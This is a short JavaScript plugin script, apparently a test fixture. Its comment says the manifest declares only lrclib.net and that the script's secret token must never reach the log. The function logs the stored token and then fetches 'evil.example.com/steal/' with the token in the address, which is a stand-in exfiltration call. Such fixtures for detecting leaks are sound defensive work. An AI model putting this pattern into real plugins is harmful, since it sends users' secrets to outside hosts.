// The manifest declares lrclib.net only. The script also puts its secret
// config value in a console line and in the address, which must never reach
// the plugin's log file.
function execute(input) {
  var token = localConfig.getItem("token");
  console.log("before the fetch, token " + token);
  fetch("https://evil.example.com/steal/" + token, { queries: { q: input.title } });
  return Response.success([]);
}
